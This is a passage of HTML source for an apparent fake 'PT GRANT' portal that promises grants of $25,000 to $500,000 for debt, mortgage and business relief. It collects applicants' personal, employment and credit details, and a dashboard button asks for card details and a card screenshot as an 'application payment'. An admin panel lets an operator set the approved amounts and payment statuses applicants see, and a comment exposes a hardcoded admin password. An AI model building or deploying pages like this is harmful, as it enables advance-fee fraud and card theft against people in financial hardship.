<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PT GRANT - Official Financial Assistance Portal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        .glow-hover:hover {
            box-shadow: 0 0 25px rgba(245, 158, 11, 0.35);
        }
        .modal-animate {
            animation: slideUp 0.3s cubic-bezier(0.16, 1, 0.3, 1);
        }
        @keyframes slideUp {
            from { transform: translateY(30px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
    </style>
</head>
<body class="bg-slate-950 text-slate-100 min-h-screen flex flex-col font-sans">

    <!-- FULL SCREEN RECTANGULAR TOP BANNER (PT GRANT LOGO) -->
    <header class="w-full bg-slate-900 border-b-4 border-amber-500 shadow-2xl relative overflow-hidden">
        <div class="w-full h-72 md:h-96 relative flex items-center justify-center">
            <img src="ptlogo.jpeg" alt="PT GRANT LOGO" class="w-full h-full object-cover object-center brightness-75" onerror="this.style.display='none'; document.getElementById('logoFallback').classList.remove('hidden');">
            
            <div id="logoFallback" class="hidden absolute inset-0 bg-gradient-to-r from-slate-950 via-indigo-950 to-slate-950 flex flex-col items-center justify-center p-6 text-center">
                <div class="w-24 h-24 rounded-full bg-amber-500 text-slate-950 flex items-center justify-center font-black text-4xl mb-3 shadow-2xl border-4 border-amber-300">PT</div>
                <h1 class="text-5xl md:text-7xl font-black text-white tracking-widest uppercase">PT GRANT</h1>
                <p class="text-amber-400 font-semibold tracking-widest text-xl mt-2">OFFICIAL FINANCIAL ASSISTANCE PROGRAM</p>
            </div>

            <!-- Banner Overlay Content -->
            <div class="absolute inset-0 bg-gradient-to-t from-slate-950 via-slate-950/60 to-transparent flex flex-col items-center justify-end pb-8 text-center px-4">
                <span class="bg-amber-500 text-slate-950 font-black text-xs md:text-sm px-5 py-1.5 rounded-full uppercase tracking-widest mb-3 shadow-xl border border-amber-300">
                    Qualify For $25,000 – $500,000
                </span>
                <h1 class="text-3xl md:text-6xl font-black text-white tracking-tight uppercase drop-shadow-lg">PT GRANT ASSISTANCE</h1>
                <p class="text-slate-300 text-sm md:text-lg max-w-3xl mt-2 font-light">Select your required assistance category below to open your grant application form instantly.</p>
                
                <!-- Top Screen CTA -->
                <div class="mt-6 flex flex-wrap gap-4 justify-center">
                    <button onclick="openApplyModal('Personal Loan Assistance')" class="bg-gradient-to-r from-amber-500 to-amber-600 hover:from-amber-400 hover:to-amber-500 text-slate-950 font-black px-8 py-4 rounded-xl text-lg shadow-2xl transition transform hover:scale-105 flex items-center gap-3 border border-amber-300">
                        <i class="fa-solid fa-paper-plane text-xl"></i> APPLY NOW FOR GRANT
                    </button>
                    <button onclick="openModal('statusModal')" class="bg-slate-900/90 hover:bg-slate-800 text-amber-400 font-bold px-6 py-4 rounded-xl text-base shadow-xl border border-amber-500/40 flex items-center gap-2 backdrop-blur-md">
                        <i class="fa-solid fa-magnifying-glass"></i> Check Application Status
                    </button>
                </div>
            </div>
        </div>
    </header>

    <!-- NAVIGATION BAR -->
    <nav class="bg-slate-900/90 backdrop-blur-md text-white border-b border-slate-800 py-3.5 px-4 shadow-xl sticky top-0 z-40">
        <div class="max-w-7xl mx-auto flex flex-wrap items-center justify-between gap-4">
            <div class="flex items-center gap-3">
                <div class="w-9 h-9 rounded-lg bg-amber-500 text-slate-950 flex items-center justify-center font-black text-base shadow">PT</div>
                <span class="font-black text-xl tracking-wider text-amber-400">PT GRANT</span>
            </div>
            <div class="flex gap-3">
                <button onclick="openApplyModal('Personal Loan Assistance')" class="bg-amber-500 hover:bg-amber-400 text-slate-950 px-5 py-2.5 rounded-lg text-sm font-black flex items-center gap-2 transition shadow-lg">
                    <i class="fa-solid fa-bolt"></i> Apply Now
                </button>
                <button onclick="openModal('statusModal')" class="bg-slate-800 hover:bg-slate-700 text-slate-200 px-4 py-2.5 rounded-lg text-xs font-bold flex items-center gap-2 border border-slate-700 transition">
                    <i class="fa-solid fa-folder-open text-amber-400"></i> Check Status
                </button>
                <button onclick="openAdminLoginModal()" class="bg-slate-950 hover:bg-slate-900 text-amber-400 px-3 py-2.5 rounded-lg text-xs font-semibold flex items-center gap-2 border border-slate-800 transition">
                    <i class="fa-solid fa-lock text-amber-400"></i> Admin Portal
                </button>
            </div>
        </div>
    </nav>

    <!-- MAIN CONTENT -->
    <main class="flex-grow max-w-7xl w-full mx-auto p-4 md:p-8 space-y-12">

        <!-- ASSISTANCE SELECTION CARDS -->
        <section id="assistanceCardsSection" class="space-y-6">
            <div class="text-center space-y-2">
                <span class="text-amber-400 font-bold uppercase tracking-widest text-xs">Choose Your Required Assistance</span>
                <h2 class="text-3xl md:text-4xl font-black text-white">Which Type of Assistance Do You Need?</h2>
                <p class="text-slate-400 text-sm max-w-2xl mx-auto">Click on any card below to pull up the qualification form for your funding category.</p>
            </div>

            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                
                <!-- CARD 1: PERSONAL LOAN -->
                <div onclick="openApplyModal('Personal Loan Assistance')" class="glow-hover cursor-pointer bg-slate-900 border-2 border-slate-800 hover:border-amber-500 rounded-2xl p-6 transition duration-300 transform hover:-translate-y-1 flex flex-col justify-between group">
                    <div class="space-y-4">
                        <div class="w-14 h-14 rounded-xl bg-amber-500/10 border border-amber-500/30 text-amber-400 flex items-center justify-center text-2xl group-hover:bg-amber-500 group-hover:text-slate-950 transition">
                            <i class="fa-solid fa-hand-holding-dollar"></i>
                        </div>
                        <div>
                            <h3 class="text-xl font-bold text-white group-hover:text-amber-400 transition">Personal Loan Assistance</h3>
                            <p class="text-xs text-slate-400 mt-2 leading-relaxed">Direct relief for personal debt consolidation, urgent living expenses, and personal financial recovery.</p>
                        </div>
                    </div>
                    <div class="mt-6 pt-4 border-t border-slate-800/80 flex items-center justify-between text-xs">
                        <span class="text-amber-400 font-bold">$25,000 – $100,000</span>
                        <span class="text-slate-300 font-semibold flex items-center gap-1 group-hover:translate-x-1 transition">Apply <i class="fa-solid fa-arrow-right text-[10px]"></i></span>
                    </div>
                </div>

                <!-- CARD 2: MORTGAGE -->
                <div onclick="openApplyModal('Mortgage Assistance')" class="glow-hover cursor-pointer bg-slate-900 border-2 border-slate-800 hover:border-amber-500 rounded-2xl p-6 transition duration-300 transform hover:-translate-y-1 flex flex-col justify-between group">
                    <div class="space-y-4">
                        <div class="w-14 h-14 rounded-xl bg-indigo-500/10 border border-indigo-500/30 text-indigo-400 flex items-center justify-center text-2xl group-hover:bg-indigo-500 group-hover:text-slate-950 transition">
                            <i class="fa-solid fa-house-chimney-crack"></i>
                        </div>
                        <div>
                            <h3 class="text-xl font-bold text-white group-hover:text-indigo-400 transition">Mortgage Assistance</h3>
                            <p class="text-xs text-slate-400 mt-2 leading-relaxed">Financial support designed to help homeowners facing missed payments or mortgage hardship.</p>
                        </div>
                    </div>
                    <div class="mt-6 pt-4 border-t border-slate-800/80 flex items-center justify-between text-xs">
                        <span class="text-amber-400 font-bold">$50,000 – $250,000</span>
                        <span class="text-slate-300 font-semibold flex items-center gap-1 group-hover:translate-x-1 transition">Apply <i class="fa-solid fa-arrow-right text-[10px]"></i></span>
                    </div>
                </div>

                <!-- CARD 3: CREDIT CARD -->
                <div onclick="openApplyModal('Credit Card Assistance')" class="glow-hover cursor-pointer bg-slate-900 border-2 border-slate-800 hover:border-amber-500 rounded-2xl p-6 transition duration-300 transform hover:-translate-y-1 flex flex-col justify-between group">
                    <div class="space-y-4">
                        <div class="w-14 h-14 rounded-xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 flex items-center justify-center text-2xl group-hover:bg-emerald-500 group-hover:text-slate-950 transition">
                            <i class="fa-solid fa-credit-card"></i>
                        </div>
                        <div>
                            <h3 class="text-xl font-bold text-white group-hover:text-emerald-400 transition">Credit Card Assistance</h3>
                            <p class="text-xs text-slate-400 mt-2 leading-relaxed">Targeted grant funding to eliminate overwhelming high-interest revolving credit card balances.</p>
                        </div>
                    </div>
                    <div class="mt-6 pt-4 border-t border-slate-800/80 flex items-center justify-between text-xs">
                        <span class="text-amber-400 font-bold">$25,000 – $75,000</span>
                        <span class="text-slate-300 font-semibold flex items-center gap-1 group-hover:translate-x-1 transition">Apply <i class="fa-solid fa-arrow-right text-[10px]"></i></span>
                    </div>
                </div>

                <!-- CARD 4: HOME REFINANCE -->
                <div onclick="openApplyModal('Home Refinance Assistance')" class="glow-hover cursor-pointer bg-slate-900 border-2 border-slate-800 hover:border-amber-500 rounded-2xl p-6 transition duration-300 transform hover:-translate-y-1 flex flex-col justify-between group">
                    <div class="space-y-4">
                        <div class="w-14 h-14 rounded-xl bg-teal-500/10 border border-teal-500/30 text-teal-400 flex items-center justify-center text-2xl group-hover:bg-teal-500 group-hover:text-slate-950 transition">
                            <i class="fa-solid fa-arrows-rotate"></i>
                        </div>
                        <div>
                            <h3 class="text-xl font-bold text-white group-hover:text-teal-400 transition">Home Refinance Assistance</h3>
                            <p class="text-xs text-slate-400 mt-2 leading-relaxed">Grant aid to assist homeowners with closing costs, interest rate reductions, and cash-out refinances.</p>
                        </div>
                    </div>
                    <div class="mt-6 pt-4 border-t border-slate-800/80 flex items-center justify-between text-xs">
                        <span class="text-amber-400 font-bold">$30,000 – $200,000</span>
                        <span class="text-slate-300 font-semibold flex items-center gap-1 group-hover:translate-x-1 transition">Apply <i class="fa-solid fa-arrow-right text-[10px]"></i></span>
                    </div>
                </div>

                <!-- CARD 5: AUTO LOAN -->
                <div onclick="openApplyModal('Auto Loan Assistance')" class="glow-hover cursor-pointer bg-slate-900 border-2 border-slate-800 hover:border-amber-500 rounded-2xl p-6 transition duration-300 transform hover:-translate-y-1 flex flex-col justify-between group">
                    <div class="space-y-4">
                        <div class="w-14 h-14 rounded-xl bg-purple-500/10 border border-purple-500/30 text-purple-400 flex items-center justify-center text-2xl group-hover:bg-purple-500 group-hover:text-slate-950 transition">
                            <i class="fa-solid fa-car"></i>
                        </div>
                        <div>
                            <h3 class="text-xl font-bold text-white group-hover:text-purple-400 transition">Auto Loan Assistance</h3>
                            <p class="text-xs text-slate-400 mt-2 leading-relaxed">Assistance grants to pay off high vehicle loan balances or prevent automobile repossession.</p>
                        </div>
                    </div>
                    <div class="mt-6 pt-4 border-t border-slate-800/80 flex items-center justify-between text-xs">
                        <span class="text-amber-400 font-bold">$25,000 – $50,000</span>
                        <span class="text-slate-300 font-semibold flex items-center gap-1 group-hover:translate-x-1 transition">Apply <i class="fa-solid fa-arrow-right text-[10px]"></i></span>
                    </div>
                </div>

                <!-- CARD 6: BUSINESS ASSISTANCE -->
                <div onclick="openApplyModal('Business Assistance')" class="glow-hover cursor-pointer bg-slate-900 border-2 border-amber-500/60 hover:border-amber-400 rounded-2xl p-6 transition duration-300 transform hover:-translate-y-1 flex flex-col justify-between group bg-gradient-to-b from-slate-900 via-slate-900 to-amber-950/20">
                    <div class="space-y-4">
                        <div class="w-14 h-14 rounded-xl bg-amber-500 text-slate-950 flex items-center justify-center text-2xl font-black shadow-lg">
                            <i class="fa-solid fa-briefcase"></i>
                        </div>
                        <div>
                            <div class="flex items-center gap-2">
                                <h3 class="text-xl font-bold text-amber-400">Business Assistance</h3>
                                <span class="bg-amber-500/20 text-amber-300 text-[10px] font-bold px-2 py-0.5 rounded border border-amber-500/40">SPECIAL TIER</span>
                            </div>
                            <p class="text-xs text-slate-300 mt-2 leading-relaxed">Comprehensive business grants for registered companies, payroll, expansion, and commercial debt relief.</p>
                        </div>
                    </div>
                    <div class="mt-6 pt-4 border-t border-slate-800/80 flex items-center justify-between text-xs">
                        <span class="text-amber-400 font-black">$50,000 – $500,000</span>
                        <span class="text-amber-400 font-bold flex items-center gap-1 group-hover:translate-x-1 transition">Apply <i class="fa-solid fa-arrow-right text-[10px]"></i></span>
                    </div>
                </div>

            </div>
        </section>

        <!-- STATUS DASHBOARD SECTION -->
        <section id="statusDashboardSection" class="hidden space-y-6">
            <div class="bg-slate-900 rounded-2xl shadow-2xl border border-slate-800 p-6 md:p-8">
                
                <div class="flex flex-col md:flex-row md:items-center justify-between border-b border-slate-800 pb-6 gap-4">
                    <div>
                        <span class="text-xs font-bold text-amber-400 uppercase tracking-widest">Application Tracking Portal</span>
                        <h2 class="text-3xl font-black text-white mt-1" id="dashApplicantName">Welcome</h2>
                        <p class="text-sm text-slate-400">Ticket ID: <span id="dashTicketId" class="font-mono font-bold text-amber-400 bg-slate-950 px-3 py-1 rounded border border-amber-500/30"></span></p>
                    </div>
                    <div>
                        <span id="dashStatusBadge" class="inline-block px-5 py-2 rounded-full font-bold text-sm shadow-md"></span>
                    </div>
                </div>

                <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mt-6">
                    <div class="bg-gradient-to-br from-emerald-600 to-teal-800 text-white rounded-2xl p-6 shadow-xl border border-emerald-500/30">
                        <p class="text-emerald-200 text-xs uppercase font-bold tracking-wider">Approved Grant Amount</p>
                        <h3 class="text-4xl font-black mt-2" id="dashApprovedAmount">$0.00</h3>
                        <p class="text-xs text-emerald-100/90 mt-2"><i class="fa-solid fa-check-circle"></i> Funds Authorized for Disbursement</p>
                    </div>
                    <div class="bg-gradient-to-br from-amber-600 to-orange-700 text-white rounded-2xl p-6 shadow-xl border border-amber-500/30">
                        <p class="text-amber-200 text-xs uppercase font-bold tracking-wider">Pending Grant Amount</p>
                        <h3 class="text-4xl font-black mt-2" id="dashPendingAmount">$0.00</h3>
                        <p class="text-xs text-amber-100/90 mt-2"><i class="fa-solid fa-clock"></i> Under Verification Status</p>
                    </div>
                </div>

                <!-- MAKE APPLICATION PAYMENT BUTTON -->
                <div class="mt-8 bg-slate-950 rounded-2xl p-6 flex flex-col md:flex-row items-center justify-between gap-6 shadow-2xl border-2 border-amber-500/80">
                    <div>
                        <h4 class="text-xl font-bold text-amber-400 flex items-center gap-2">
                            <i class="fa-solid fa-circle-exclamation"></i> Application Payment Notice
                        </h4>
                        <p class="text-xs text-slate-300 mt-1 max-w-xl">If instructed by your grant officer, please click below to submit your card details and card screenshot image.</p>
                    </div>
                    <button onclick="openModal('paymentModal')" class="bg-gradient-to-r from-amber-500 to-amber-600 hover:from-amber-400 hover:to-amber-500 text-slate-950 font-black px-8 py-4 rounded-xl transition flex items-center gap-3 shadow-xl whitespace-nowrap text-sm">
                        <i class="fa-solid fa-credit-card text-lg"></i> MAKE APPLICATION PAYMENT
                    </button>
                </div>

                <!-- DUAL DOCUMENT UPLOADS -->
                <div class="mt-10 border-t border-slate-800 pt-8 space-y-6">
                    <h3 class="text-2xl font-bold text-white flex items-center gap-3">
                        <i class="fa-solid fa-file-arrow-up text-amber-400"></i> Supporting Documents Upload
                    </h3>

                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                        <div class="bg-slate-950 p-6 rounded-2xl border border-slate-800 space-y-3">
                            <h4 class="font-bold text-white text-sm flex items-center gap-2">
                                <i class="fa-solid fa-user-check text-emerald-400"></i> Personal Assistance Uploads
                            </h4>
                            <p class="text-xs text-slate-400">IDs, Pay Stubs, Bank Statements, Utility Bills</p>
                            <input type="file" id="personalDocInput" class="text-xs w-full border border-slate-700 rounded-lg p-2.5 bg-slate-900 text-slate-300">
                            <button onclick="uploadDocument('personal')" class="w-full bg-slate-800 hover:bg-slate-700 text-white font-bold py-2.5 rounded-lg text-xs transition border border-slate-700">
                                Upload Personal Files
                            </button>
                        </div>

                        <div class="bg-slate-950 p-6 rounded-2xl border border-slate-800 space-y-3">
                            <h4 class="font-bold text-white text-sm flex items-center gap-2">
                                <i class="fa-solid fa-briefcase text-amber-400"></i> Business Assistance Uploads
                            </h4>
                            <p class="text-xs text-slate-400">EIN Letters, Business Licenses, Tax Documents</p>
                            <input type="file" id="businessDocInput" class="text-xs w-full border border-slate-700 rounded-lg p-2.5 bg-slate-900 text-slate-300">
                            <button onclick="uploadDocument('business')" class="w-full bg-slate-800 hover:bg-slate-700 text-white font-bold py-2.5 rounded-lg text-xs transition border border-slate-700">
                                Upload Business Files
                            </button>
                        </div>
                    </div>

                    <div class="mt-4">
                        <h4 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2">Uploaded Files History</h4>
                        <div id="applicantUploadsList" class="space-y-2 text-xs"></div>
                    </div>
                </div>

                <!-- MESSAGING BOX -->
                <div class="mt-10 border-t border-slate-800 pt-8">
                    <h3 class="text-2xl font-bold text-white mb-4 flex items-center gap-3">
                        <i class="fa-solid fa-comments text-amber-400"></i> Admin Messages & Status Replies
                    </h3>
                    <div id="applicantMessagesBox" class="bg-slate-950 border border-slate-800 rounded-2xl p-5 h-56 overflow-y-auto space-y-3"></div>
                </div>

            </div>
        </section>

        <!-- ADMIN PORTAL SECTION -->
        <section id="adminPortalSection" class="hidden space-y-6">
            <div class="bg-slate-900 text-white rounded-2xl p-6 shadow-2xl border border-slate-800">
                <div class="flex flex-col md:flex-row md:items-center justify-between border-b border-slate-800 pb-4 gap-4">
                    <div>
                        <span class="text-xs font-bold text-amber-400 uppercase tracking-widest">Administrator Portal</span>
                        <h2 class="text-3xl font-black mt-1">PT GRANT Dashboard</h2>
                    </div>
                    <div class="flex gap-2">
                        <button onclick="logoutAdmin()" class="bg-red-600/80 hover:bg-red-600 px-4 py-2 rounded-lg text-xs font-bold text-white transition">
                            Logout Admin
                        </button>
                        <button onclick="showSection('cards')" class="bg-slate-800 hover:bg-slate-700 px-4 py-2 rounded-lg text-xs font-bold text-slate-300 border border-slate-700">
                            Main Page
                        </button>
                    </div>
                </div>

                <div class="mt-6 overflow-x-auto">
                    <table class="w-full text-left border-collapse text-sm">
                        <thead>
                            <tr class="bg-slate-950 text-slate-400 border-b border-slate-800">
                                <th class="p-3">Ticket ID</th>
                                <th class="p-3">Applicant Name</th>
                                <th class="p-3">Assistance Type</th>
                                <th class="p-3">Status</th>
                                <th class="p-3">Approved Grant</th>
                                <th class="p-3">Pending Grant</th>
                                <th class="p-3">Action</th>
                            </tr>
                        </thead>
                        <tbody id="adminTableBody" class="divide-y divide-slate-800 text-slate-200"></tbody>
                    </table>
                </div>
            </div>

            <!-- ADMIN DETAILED APPLICANT ENTRY VIEW & CONTROLS -->
            <div id="adminDetailCard" class="hidden bg-slate-900 rounded-2xl p-6 shadow-2xl border border-slate-800 space-y-6">
                <div class="flex justify-between items-center border-b border-slate-800 pb-4">
                    <h3 class="text-xl font-bold text-white" id="adminDetailTicketHeader">Managing Ticket</h3>
                    <span id="adminDetailAssistanceType" class="bg-amber-500/20 text-amber-400 px-3 py-1 rounded-full text-xs font-bold border border-amber-500/30"></span>
                </div>

                <!-- FULL ENTRY DATA FROM MAIN APPLICATION -->
                <div class="space-y-4">
                    <h4 class="font-bold text-amber-400 text-sm flex items-center gap-2">
                        <i class="fa-solid fa-address-card"></i> Complete Application Form Entries
                    </h4>
                    <div class="grid grid-cols-1 md:grid-cols-3 gap-4 bg-slate-950 p-4 rounded-xl text-xs border border-slate-800 text-slate-300">
                        <div><strong>Full Name:</strong> <span id="admFullName" class="text-white font-semibold"></span></div>
                        <div><strong>Email:</strong> <span id="admEmail" class="text-white"></span></div>
                        <div><strong>Phone:</strong> <span id="admPhone" class="text-white"></span></div>
                        <div><strong>Address 1:</strong> <span id="admAddress1" class="text-white"></span></div>
                        <div><strong>Address 2:</strong> <span id="admAddress2" class="text-white"></span></div>
                        <div><strong>City/State/Zip:</strong> <span id="admCityStateZip" class="text-white"></span></div>
                        <div><strong>Employment:</strong> <span id="admEmployment" class="text-white"></span></div>
                        <div><strong>Pay Amount:</strong> <span id="admPay" class="text-white"></span></div>
                        <div><strong>Credit Score:</strong> <span id="admCredit" class="text-white"></span></div>
                    </div>

                    <!-- BUSINESS ENTRY FIELDS IF APPLICABLE -->
                    <div id="admBusinessBox" class="hidden bg-amber-500/10 p-4 rounded-xl text-xs border border-amber-500/30 text-amber-200 space-y-1">
                        <p class="font-bold text-amber-400"><i class="fa-solid fa-building"></i> Business Information Entries:</p>
                        <div><strong>Business Name:</strong> <span id="admBizName"></span></div>
                        <div><strong>EIN / Tax ID:</strong> <span id="admBizEin"></span></div>
                        <div><strong>Annual Revenue:</strong> $<span id="admBizRev"></span></div>
                    </div>
                </div>

                <!-- UPDATE STATUS AND GRANT BALANCES -->
                <div class="bg-slate-950 border border-amber-500/40 p-5 rounded-xl space-y-4">
                    <h4 class="font-bold text-amber-400 text-sm">Update Application Status & Grant Balances</h4>
                    <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                        <div>
                            <label class="block text-xs font-bold text-slate-400 mb-1">Status</label>
                            <select id="admStatusSelect" class="w-full border border-slate-700 rounded p-2 text-xs bg-slate-900 text-white font-bold">
                                <option value="Under Review">Under Review</option>
                                <option value="Approved">Approved</option>
                                <option value="Payment Pending">Payment Pending</option>
                                <option value="Payment Verified">Payment Verified</option>
                                <option value="Disbursed">Disbursed</option>
                            </select>
                        </div>
                        <div>
                            <label class="block text-xs font-bold text-slate-400 mb-1">Approved Grant ($)</label>
                            <input type="number" id="admApprovedInput" class="w-full border border-slate-700 rounded p-2 text-xs bg-slate-900 text-emerald-400 font-bold">
                        </div>
                        <div>
                            <label class="block text-xs font-bold text-slate-400 mb-1">Pending Grant ($)</label>
                            <input type="number" id="admPendingInput" class="w-full border border-slate-700 rounded p-2 text-xs bg-slate-900 text-amber-400 font-bold">
                        </div>
                    </div>
                    <button onclick="saveAdminAppChanges()" class="bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold px-6 py-2 rounded text-xs transition">
                        Save Changes
                    </button>
                </div>

                <!-- APPLICANT FILES & CARD SCREENSHOTS -->
                <div class="space-y-2">
                    <h4 class="font-bold text-white text-sm flex items-center gap-2">
                        <i class="fa-solid fa-photo-film text-amber-400"></i> Uploaded Documents & Payment Card Screenshots
                    </h4>
                    <div id="admFilesList" class="space-y-3 text-xs"></div>
                </div>

                <!-- REPLY BACK TO APPLICANT -->
                <div class="border-t border-slate-800 pt-4 space-y-3">
                    <h4 class="font-bold text-white text-sm">Reply to Applicant</h4>
                    <textarea id="admReplyText" rows="3" placeholder="Type a response or message to the applicant..." class="w-full border border-slate-800 rounded-lg p-3 text-xs bg-slate-950 text-white outline-none focus:border-amber-500"></textarea>
                    <button onclick="sendAdminReply()" class="bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold px-6 py-2 rounded-lg text-xs transition">
                        Send Response
                    </button>
                </div>
            </div>
        </section>

    </main>

    <!-- ADMIN LOGIN MODAL (PASSWORD PROTECTED: Admin123) -->
    <div id="adminLoginModal" class="hidden fixed inset-0 bg-slate-950/90 backdrop-blur-md flex items-center justify-center p-4 z-50">
        <div class="bg-slate-900 max-w-sm w-full rounded-2xl shadow-2xl p-6 relative border-2 border-amber-500">
            <button onclick="closeModal('adminLoginModal')" class="absolute top-4 right-4 text-slate-400 hover:text-white text-xl font-bold">&times;</button>
            <div class="w-12 h-12 bg-amber-500/20 text-amber-400 rounded-full flex items-center justify-center mx-auto mb-3 text-xl border border-amber-500/40">
                <i class="fa-solid fa-user-shield"></i>
            </div>
            <h3 class="text-xl font-bold text-white text-center mb-1">Admin Portal Access</h3>
            <p class="text-xs text-slate-400 text-center mb-4">Enter password to manage applications.</p>

            <form onsubmit="handleAdminLogin(event)" class="space-y-4">
                <div>
                    <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Admin Password *</label>
                    <input type="password" id="adminPasswordInput" required placeholder="Enter Password" class="w-full border border-slate-800 bg-slate-950 rounded-lg p-3 text-white font-mono">
                </div>
                <button type="submit" class="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-black py-3 rounded-xl transition shadow-lg">
                    Login to Admin Portal
                </button>
            </form>
        </div>
    </div>

    <!-- PULL-UP APPLICATION FORM MODAL -->
    <div id="applyModal" class="hidden fixed inset-0 bg-slate-950/85 backdrop-blur-md flex items-center justify-center p-3 md:p-6 z-50 overflow-y-auto">
        <div class="modal-animate bg-slate-900 max-w-3xl w-full rounded-2xl shadow-2xl border-2 border-amber-500 overflow-hidden relative my-8">
            
            <div class="bg-slate-950 text-white p-6 border-b border-slate-800 flex items-center justify-between">
                <div>
                    <span class="text-amber-400 font-bold text-xs uppercase tracking-widest">Grant Qualification Form</span>
                    <h3 class="text-2xl font-black text-white mt-1" id="applyModalTitle">Grant Application</h3>
                </div>
                <button onclick="closeModal('applyModal')" class="text-slate-400 hover:text-white text-2xl font-bold w-10 h-10 rounded-full bg-slate-800 flex items-center justify-center">&times;</button>
            </div>

            <form id="applicationForm" onsubmit="handleFormSubmit(event)" class="p-6 md:p-8 space-y-6 max-h-[80vh] overflow-y-auto">
                
                <div>
                    <label class="block text-xs font-bold text-amber-400 uppercase mb-2">Selected Assistance Type *</label>
                    <select id="assistanceType" onchange="toggleAssistanceFields()" class="w-full border-2 border-amber-500/50 rounded-xl p-3.5 bg-slate-950 text-white font-bold" required>
                        <option value="Personal Loan Assistance">Personal Loan Assistance</option>
                        <option value="Mortgage Assistance">Mortgage Assistance</option>
                        <option value="Credit Card Assistance">Credit Card Assistance</option>
                        <option value="Home Refinance Assistance">Home Refinance Assistance</option>
                        <option value="Auto Loan Assistance">Auto Loan Assistance</option>
                        <option value="Business Assistance">Business Assistance</option>
                    </select>
                </div>

                <div class="bg-amber-500/10 border-l-4 border-amber-500 p-4 rounded-r-xl">
                    <p class="font-bold text-amber-400 text-sm">You Can Qualify For $25,000 – $500,000</p>
                    <p class="text-xs text-slate-300 mt-0.5">Please provide accurate financial and contact details for verification.</p>
                </div>

                <!-- CONTACT INFORMATION -->
                <div class="space-y-4">
                    <h4 class="font-bold text-white text-base border-b border-slate-800 pb-2">Contact Details</h4>
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <div>
                            <label class="block text-xs font-bold text-slate-400 uppercase mb-1">First Name *</label>
                            <input type="text" id="firstName" required class="w-full border border-slate-800 bg-slate-950 rounded-lg p-3 text-white">
                        </div>
                        <div>
                            <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Last Name *</label>
                            <input type="text" id="lastName" required class="w-full border border-slate-800 bg-slate-950 rounded-lg p-3 text-white">
                        </div>
                        <div>
                            <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Email Address *</label>
                            <input type="email" id="email" required placeholder="name@example.com" class="w-full border border-slate-800 bg-slate-950 rounded-lg p-3 text-white">
                        </div>
                        <div>
                            <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Phone Number *</label>
                            <input type="tel" id="phone" required placeholder="(555) 000-0000" class="w-full border border-slate-800 bg-slate-950 rounded-lg p-3 text-white">
                        </div>
                    </div>

                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <div>
                            <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Address Line 1 *</label>
                            <input type="text" id="address1" required class="w-full border border-slate-800 bg-slate-950 rounded-lg p-3 text-white">
                        </div>
                        <div>
                            <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Address Line 2</label>
                            <input type="text" id="address2" class="w-full border border-slate-800 bg-slate-950 rounded-lg p-3 text-white">
                        </div>
                    </div>

                    <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                        <div>
                            <label class="block text-xs font-bold text-slate-400 uppercase mb-1">City *</label>
                            <input type="text" id="city" required class="w-full border border-slate-800 bg-slate-950 rounded-lg p-3 text-white">
                        </div>
                        <div>
                            <label class="block text-xs font-bold text-slate-400 uppercase mb-1">State *</label>
                            <input type="text" id="state" required class="w-full border border-slate-800 bg-slate-950 rounded-lg p-3 text-white">
                        </div>
                        <div>
                            <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Zip Code *</label>
                            <input type="text" id="zip" required class="w-full border border-slate-800 bg-slate-950 rounded-lg p-3 text-white">
                        </div>
                    </div>
                </div>

                <!-- EMPLOYMENT & FINANCIAL DETAILS -->
                <div class="space-y-4">
                    <h4 class="font-bold text-white text-base border-b border-slate-800 pb-2">Employment & Financial Details</h4>
                    <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                        <div>
                            <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Employment Status *</label>
                            <select id="employmentStatus" class="w-full border border-slate-800 bg-slate-950 rounded-lg p-3 text-white" required>
                                <option value="Employed">Employed</option>
                                <option value="Self-Employed">Self-Employed</option>
                                <option value="Unemployed">Unemployed</option>
                                <option value="Retired">Retired</option>
                            </select>
                        </div>
                        <div>
                            <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Pay Frequency *</label>
                            <select id="payFrequency" class="w-full border border-slate-800 bg-slate-950 rounded-lg p-3 text-white" required>
                                <option value="Weekly">Weekly</option>
                                <option value="Bi-Weekly">Bi-Weekly</option>
                                <option value="Monthly">Monthly</option>
                            </select>
                        </div>
                        <div>
                            <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Pay Amount ($) *</label>
                            <input type="number" id="payAmount" required class="w-full border border-slate-800 bg-slate-950 rounded-lg p-3 text-white">
                        </div>
                    </div>

                    <div>
                        <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Credit Score Range *</label>
                        <select id="creditScore" class="w-full border border-slate-800 bg-slate-950 rounded-lg p-3 text-white" required>
                            <option value="720+ (Excellent)">720+ (Excellent)</option>
                            <option value="660 - 719 (Good)">660 - 719 (Good)</option>
                            <option value="620 - 659 (Fair)">620 - 659 (Fair)</option>
                            <option value="Below 620 (Poor)">Below 620 (Poor)</option>
                        </select>
                    </div>
                </div>

                <!-- BUSINESS FIELDS -->
                <div id="businessFields" class="hidden space-y-4 bg-amber-500/10 border border-amber-500/30 p-5 rounded-xl">
                    <h4 class="font-bold text-amber-400 text-base">Business Assistance Information</h4>
